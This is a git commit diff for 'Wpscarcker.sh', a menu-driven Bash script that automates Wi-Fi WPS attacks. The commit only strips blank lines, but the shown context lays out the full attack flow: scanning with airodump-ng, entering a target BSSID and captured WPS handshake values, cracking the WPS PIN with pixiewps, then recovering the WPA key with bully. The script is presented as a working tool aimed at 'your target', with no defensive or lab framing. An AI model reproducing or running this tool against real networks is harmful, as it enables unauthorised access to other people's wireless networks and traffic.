537d94902c2b3bcc5cae5a4cfa8a8643ee0139ca
MrHassan1 <h.waatmani@gmail.com>
2016-12-22 17:33:11 +0000

    Update Wpscarcker.sh

--- Wpscarcker.sh
+++ Wpscarcker.sh
@@ -8,7 +8,6 @@ quest='Y'
 while  [ $quest == 'Yes' ] || [ $quest == 'Y' ] || [ $quest == 'y' ] || [ $quest == 'yes' ];
 do
  clear
-
 # Regular Colors
 Black='\e[0;30m'        # Black
 Red='\e[0;31m'          # Red
@@ -19,7 +18,6 @@ Purple='\e[0;35m'       # Purple
 Cyan='\e[0;36m'         # Cyan
 White='\e[0;37m'        # White
 Force='\033[0m'
-
 echo -e "﻿$Red██╗    ██╗██████╗ ███████╗   $Green ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ "
 sleep 0.1
 echo -e "$Red██║    ██║██╔══██╗██╔════╝   $Green ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗"
@@ -87,14 +85,12 @@ read click
 airodump-ng $themon
 
 
-
 printf "                                                     ${Green}Step ${Red}1  ${Force}"
 echo ""
 sleep 1
 
 printf "${Red}Please Enter ${Force} ${Green} The BSSID${Force} ${Red}Of Your target${Force} : "
 read BSSID
-
 
 printf "                                                     ${Green}Step ${Red}2  ${Force}"
 echo ""
@@ -119,7 +115,6 @@ sleep 1
 printf "${Blue}Enter ${Force} ${Puple} The Pke${Force} : "
 read e
 
-
 printf "                                                     ${Green}Step ${Red}4  ${Force}"
 echo ""
 sleep 1
@@ -131,14 +126,12 @@ printf "                                                     ${Green}Step ${Red}
 echo ""
 sleep 1
 
-
 printf "${Blue}Enter ${Force} ${Puple}E-Hash2${Force} "
 read z
 
 printf "                                                     ${Green}Step ${Red}6  ${Force}"
 echo ""
 sleep 1
-
 
 printf "${Blue}Enter${Force} ${Puple}Pkr${Force} "
 read r
@@ -172,7 +165,6 @@ sleep 1
 printf "${Green}$Red Wait until the$Green PIN$Red is cracked,this may take few seconds ...$White"
 pixiewps -f -e $e -s $s -z $z  -r $r -n $n -a $auth -m $m -b $BSSID -v 3  
 
-
 echo " [*] BSSID : $BSSID "
 printf "${Blue}Sorry pin not found , good luck next time${Force} "
 sleep 1
@@ -185,11 +177,9 @@ echo""
 printf "              ${Green}Now Crack ${Force}${Green1}  The KEY WPA${Force}"
 sleep 2
 
-
 printf "                                                      ${Green}Step ${Red}11  ${Force}"
 echo ""
 sleep 1
-
 
 printf "${Blue}Enter ${Force} ${Green}PIN${Force} ${Red} That You cracked  ${Force} : "
 read pin
@@ -202,7 +192,6 @@ sleep 1
 printf "${Blue}if you connected to another ${Green}Wifi${Force} ${Blue}Please Disconnected ${Force}, ${Cyan}Now Click Enter : "
 read Click
 
-
 printf "                                     ${Green}Step ${Red}12  ${Force}"
 echo ""
 printf "$Red Wait until the$Green KEY WPA$Red is cracked,this may take few seconds ...$White"
@@ -210,30 +199,23 @@ echo""
 
 bully -p $pin -b $BSSID -c $Chane1 -B -F  $themon
 
-
-
 echo ""
 printf "Congratulation , The process of${Green} Bully ${White} has completed${Green} successfully.\n" 
 
 echo ""
 printf "${Blue}Sorry WPA KEY not found , good luck next time.${Force}"  
 read a
-
-
 	 
 elif test $menu == '2'
  then
- 	
-
+ 
 sleep 1
 printf "                                      ${Green}Step ${Red}1  ${Force}"
 echo ""
 sleep 1
 
-
 printf "${Blue}Enter Your ${Force} ${Purple}Pke${Force} : "
 read e
-
 
 printf "                                     ${Green}Step ${Red}2  ${Force}"
 echo ""
@@ -246,14 +228,12 @@ printf "                                     ${Green}Step ${Red}3  ${Force}"
 echo ""
 sleep 1
 
-
 printf "${Blue}Enter Your${Force} ${Purple}E-Hash2${Force} : "
 read z
 
 printf "                                     ${Green}Step ${Red}4  ${Force}"
 echo ""
 sleep 1
-
 
 printf "${Blue}Enter Your${Force} ${Purple}Pkr${Force} : "
 read r
@@ -294,21 +274,15 @@ sleep 1
 printf "$Red Wait until the$Green PIN$Red is cracked,this may take few seconds ...$White "
 pixiewps -f -e $e -s $s -z $z  -r $r -n $n -a $Auth -m $m -b $BSSID -v 3 
 
-
 echo " $BSSID "
 printf "${Blue}Congratulation , The process of${Green} pixiewps ${White} has completed${Green} successfully.\n${Force}"
 printf "${Blue}Sorry pin not found , good luck next time.${Force}"
 
-
- 	
 elif test $menu == '3'
  then
  	
 
 sleep 2
-
-
-
 
 printf "                                                         ${Green}Step ${Red}1  ${Force}"
 echo ""
@@ -317,7 +291,6 @@ sleep 1
 
 printf "${Blue}Please Enter ${Force} ${Purple}The BSSID${Force} ${Red}Of Your target${Force} : "
 read BSSID
-
 
 printf "                                  			${Green}Step ${Red}2  ${Force}"
 echo ""
@@ -329,7 +302,6 @@ read Chane1
 printf "                                  			${Green}Step ${Red}3  ${Force}"
 echo ""
 sleep 1
-
 
 printf "${Blue}Enter Your ${Force} ${Purple}Pin${Force} : "
 read pin
@@ -353,9 +325,7 @@ bully -p $pin -b $BSSID -c $Chane1 -B -F  $themon
 
 printf "Congratulation , The process of${Green} Bully ${White} has completed${Green} successfully"
 printf "${Blue}Sorry WPA KEY not found , good luck next time.${Force}"  
-read a
- 	
- 	
+read a 	
 
 elif test $menu == '4'
  then
@@ -368,23 +338,18 @@ echo -e "$Green Partners ${White}: ${Cyan}OwElkoDev${White} and ${Cyan} X-Optix$
 echo ""
 exit
 
-
 else 
 echo -e "${Red} Please Select your Choise${Force} :)";
 fi
 echo
 echo -n -e " Back to menu? (${Green} Yes${Force} Or ${Red}No${Force}):";
 read quest;
-
     
 echo ""
 sleep 1
 echo ""
 echo -e "$Green Partners ${White}: ${Cyan}OwElkoDev${White} and ${Cyan} X-Optix${White} ."
 echo ""
-
-
-
 fi
 done
 
